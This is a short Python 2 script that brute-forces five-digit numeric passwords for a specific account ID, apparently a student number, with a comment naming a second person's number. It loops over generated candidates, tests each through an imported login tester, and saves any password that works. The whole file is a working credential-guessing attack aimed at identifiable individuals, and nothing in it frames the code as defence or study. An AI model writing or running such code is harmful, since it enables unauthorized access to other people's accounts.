from PasswordTester import PasswordTester
from Generator import Generator


def passwordStartsWithZero(password):
    print password[0]
    if int(password[0]) == 0:
        return True
    return False

tester = PasswordTester()
std_number = 214001497 # besufekads is 211002958
l = Generator.generate(1234567890, 5)
l = reversed(l)
for password in l:
    print password
    if passwordStartsWithZero(password):
        continue
    tried = tester.checkIfPasswordTried(int(password), None)
    if tried:
        print "Password " + str(password) + " Already tried"
    else:
        found = tester.testPassword(std_number, password)
        if found:
            if tester.confirmPasswordWorked(std_number, password):
                tester.saveWorkedPassword(std_number, password)
                raw_input("Password Found as " + str(password) + " Enter anything exit")

raw_input("Enter anything to exit")
tester.cleanUp()

"""
tester.back()
tester.testLogin(std_number, 12345)

tester = 

gen = Generator.generate(12345, 5)
for g in gen:
    if tester.check(g, None):
        raw_input("Password found as " + str(g))

"""

